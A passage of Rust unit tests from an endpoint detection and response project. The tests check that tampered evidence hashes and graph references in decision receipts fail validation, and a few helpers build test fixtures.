            .contains("evidence bundle node count evidence hash"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle content hash evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("evidence bundle graph slice reference"));
    }

    fn response_actor(endpoint_id: &str) -> EndpointDecisionActor {
        EndpointDecisionActor {
            endpoint_id: endpoint_id.to_string(),
            session_id: Some("session-response".to_string()),
            posture: Some("restricted".to_string()),
            agent_id: Some("agent-api:test".to_string()),
            workload_id: Some("endpoint-response-engine".to_string()),
            ..EndpointDecisionActor::default()
        }
    }

    fn valid_detection_receipt(
        local_sequence: u64,
        endpoint_id: &str,
        signer_identity: &str,
        observation: &EndpointObservation,
        finding: &DetectionFinding,
        graph: &CausalGraph,
    ) -> EndpointDecisionReceipt {
        EndpointDecisionReceipt::for_detection(EndpointDetectionReceiptInput {
            local_sequence,
            endpoint_id,
            signer_identity,
            policy: EndpointPolicySnapshot {
                policy_version: "test-policy@1".to_string(),
                policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                policy_epoch: 7,
            },
            sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
            observation,
            finding,
            graph,
        })
    }

    fn temp_root() -> PathBuf {
        let millis = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        let counter = TEMP_ROOT_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-edr-test-{}-{millis}-{counter}",
            std::process::id(),
        ))
    }
}
